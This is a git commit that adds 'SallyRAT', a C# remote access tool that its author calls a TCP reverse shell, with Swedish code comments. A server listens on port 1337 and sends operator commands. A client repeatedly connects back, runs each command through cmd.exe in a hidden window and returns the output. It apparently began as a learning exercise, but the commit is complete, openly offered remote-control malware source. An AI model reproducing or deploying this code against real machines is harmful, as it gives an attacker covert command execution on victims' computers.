0a4645c4888f1dacf2a213f0fefff02b0bae27da
DUNDERSAPO <132703320+DUNDERSAPO@users.noreply.github.com>
2024-08-20 21:14:18 +0200

    Release!
    I have created a TCP Reverse Shell in  C#. :100:
    
    Features:
    Executing CMD commands :white_check_mark:
    
    Thanks WilleLX1 :heart:

---
+++ SallyRAT/Program.cs
@@ -0,0 +1,91 @@
+﻿using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.IO;   
+using System.Text;
+
+namespace SallyRAT
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+
+            TcpListener listener = new TcpListener(IPAddress.Any, 1337); // den här raden skapar en lyssnare på port 1337
+
+            listener.Start();
+
+            Console.WriteLine("Listening on port 1337");
+
+            while (true) // den här loopen körs tills programmet stängs av
+            {
+                TcpClient client2 = null; // här skapar vi variabler för TcpClient, NetworkStream, StreamReader och StreamWriter
+                NetworkStream stream2 = null;
+                StreamReader reader2 = null;
+                StreamWriter writer2 = null;
+
+                try // här försöker vi ansluta till en klient
+                {
+                    client2 = listener.AcceptTcpClient(); // här accepterar vi en inkommande anslutning
+                    stream2 = client2.GetStream(); // här skapar vi en variabel för att skicka och ta emot data
+                    reader2 = new StreamReader(stream2); // här skapar vi en variabel för att läsa data
+                    writer2 = new StreamWriter(stream2) { AutoFlush = true }; // här skapar vi en variabel för att skriva data
+
+                    Console.WriteLine("Client Connected");
+
+                    Thread.Sleep(1000);
+
+                    while (client2.Connected) // I denna loop skickar vi kommandon till klienten och tar emot output
+                    {
+
+                        Console.Write ("SallyRAT> ");
+                        string command = Console.ReadLine();
+
+                        if (string.IsNullOrEmpty(command))
+                        {
+                            continue;
+                        }
+
+                        if (command.ToLower() == "exit")
+                        {
+                            break;
+
+                        }
+                        writer2.WriteLine(command);
+
+                        string output;
+                        while ((output = reader2.ReadLine()) != null) // Här ser vi till så att den kan outputta all text och inte bara en linje. TEX IPCONFIG 
+                        {
+                            if (output == "END_OF_OUTPUT")
+                            {
+                                break;
+                            }
+                            Console.WriteLine(output);
+                        }
+
+                       
+
+
+                    }
+                    
+                    Console.WriteLine("Client Disconnected");
+                    Console.WriteLine("Listening For New Client");
+                }
+                catch (Exception e) // Om nåt går åt helvete säger den till vad som gick fel
+                {
+                    Console.WriteLine(e.Message);
+                }
+                finally // Stänger alla anslutningar
+                {
+                    writer2.Close();
+                    reader2.Close();
+                    stream2.Close();
+                    client2.Close();
+                }
+
+            }
+        }
+        
+    }
+}
---
+++ clientSallyRAT/Client.cs
@@ -0,0 +1,90 @@
+﻿using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.IO;
+using System.Text;
+
+namespace clientSallyRAT
+{
+    class Client
+    {
+        static void Main(string[] args)
+        {
+
+            TcpClient client = null; // här skapar vi variabler för TcpClient, NetworkStream, StreamReader och StreamWriter
+
+            NetworkStream stream = null;
+            StreamReader reader = null;
+            StreamWriter writer = null;
+
+            while (client == null || !client.Connected) // här försöker vi ansluta till servern
+            {
+                try 
+                {
+                    Console.WriteLine("Attempting to connect to SallyRAT");
+                    client = new TcpClient();
+                    client.Connect("127.0.0.1", 1337);
+
+                    stream = client.GetStream();
+                    reader = new StreamReader(stream);
+                    writer = new StreamWriter(stream) { AutoFlush = true };
+
+                    Console.WriteLine("YAYYYYY WE HAVE CONNECTED TO SERVER");
+                }
+                catch (Exception ex) // om vi inte kan ansluta till servern så skriver vi ut ett felmeddelande och försöker igen om 5 sekunder
+                {
+                    Console.WriteLine("Failed to connect to SallyRAT");
+                    Console.WriteLine(ex.Message);
+                    Console.WriteLine("Trying Again In 5 Seconds.");
+                    System.Threading.Thread.Sleep(5000);
+                }
+            }
+            Console.WriteLine("Successfully Slaved to SallyRAT");
+
+            try
+            {
+
+                while (client.Connected) // Denna loopen är igång sålänge jag är ansluten till servern
+                {
+                    string command = reader.ReadLine();
+
+                    if (string.IsNullOrEmpty(command)) // om kommandot är tomt så ignoreras det och låter loopen starta om
+                    {
+                        continue;
+                    }
+
+                    Process process = new Process(); // här startar vi en process som kör cmd.exe och kör kommandot som vi skickade från servern
+                    process.StartInfo.FileName = "cmd.exe";
+                    process.StartInfo.Arguments = "/c " + command;
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.StartInfo.CreateNoWindow = true;
+                    process.Start();
+
+
+
+                    string output; 
+                    while ((output = process.StandardOutput.ReadLine()) != null) // Denna gör att det som kommer upp på clientsided skickas över till Servern och sen kan den även skriva multilined text som tex ipconfig
+                    {
+                        writer.WriteLine(output); 
+                    }
+
+                    writer.WriteLine("END_OF_OUTPUT"); //här skickar vi till servern för "logik" att outputtet är slut PS william är da teacher
+                } 
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            finally
+            {
+                writer.Close();
+                reader.Close();
+                stream.Close();
+                client.Close();
+            }
+
+        }
+    }
+}
